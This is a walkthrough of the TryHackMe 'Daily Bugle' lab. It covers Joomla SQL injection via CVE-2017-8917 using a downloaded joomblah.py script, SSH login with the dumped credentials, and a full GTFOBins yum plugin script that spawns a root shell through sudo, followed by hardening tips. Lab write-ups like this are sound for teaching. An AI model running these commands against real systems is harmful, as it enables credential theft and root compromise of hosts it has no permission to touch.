---
date: '2025-02-02T00:35:49+05:30'
draft: false
title: 'Daily Bugle: TryHackMe Walkthrough'
slug: daily-bugle-thm
tags: ["tryhackme", "joomla", "sql-injection", "yum", "gtfobins"]
category: writeups
showtoc: true
summary: A walkthrough of the Daily Bugle room on TryHackMe, demonstrating Joomla exploitation, SQL injection, and privilege escalation via yum
description: Learn how to exploit a vulnerable Joomla CMS, perform SQL injection using CVE-2017-8917, and escalate privileges using yum GTFO technique
---

# Daily Bugle: TryHackMe Walkthrough

## Initial Enumeration

### Nmap Scan Results
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB (unauthorized)
```

Key findings:
- Joomla CMS running on port 80
- MariaDB on port 3306
- OpenSSH 7.4

### Web Enumeration
From robots.txt, discovered multiple disallowed entries:
```
/joomla/administrator/
/administrator/
/bin/
/cache/
/cli/
/components/
/includes/
/installation/
/language/
/layouts/
/libraries/
/logs/
/modules/
/plugins/
/tmp/
```

## Vulnerability Assessment

### Joomla Exploitation
1. Identified vulnerable Joomla version
2. Used CVE-2017-8917 for SQL injection
   - [Exploit reference](https://www.exploit-db.com/exploits/42033)
   - Alternative: [joomblah.py script](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py)

### SQL Injection Process
1. Download exploit:
```bash
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
```

2. Execute against target:
```bash
python joomblah.py http://target-ip
```

3. Extract user credentials from the database dump

## Initial Access

### SSH Access
1. Successfully obtained credentials for user 'jjameson'
2. SSH login:
```bash
ssh jjameson@target-ip
```

## Privilege Escalation

### Enumeration
Check sudo permissions:
```bash
sudo -l
```

### Yum Privilege Escalation
1. Found yum with sudo privileges
2. Used GTFOBins technique for yum:
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

## Best Practices

1. **Web Application Security**
   - Keep CMS systems updated
   - Implement proper access controls
   - Regular security audits

2. **Database Security**
   - Strong password policies
   - Limited network access
   - Regular backups

3. **System Hardening**
   - Restrict sudo permissions
   - Monitor privileged commands
   - Regular security patches

## Tools Used

1. **Enumeration**
   - Nmap for port scanning
   - Web browser for initial recon
   - robots.txt analysis

2. **Exploitation**
   - joomblah.py for SQL injection
   - SSH client for access
   - GTFOBins for privilege escalation

## Additional Notes

1. **Target Hardening**
   - Update Joomla to latest version
   - Implement WAF protection
   - Review sudo permissions

2. **Detection & Prevention**
   - Enable detailed logging
   - Implement IDS/IPS
   - Regular security assessments

## References

1. [CVE-2017-8917 Details](https://www.exploit-db.com/exploits/42033)
2. [Joomla Security Documentation](https://docs.joomla.org/Security_Checklist)
3. [GTFOBins - Yum](https://gtfobins.github.io/gtfobins/yum/)
4. [TryHackMe - Daily Bugle](https://tryhackme.com/)
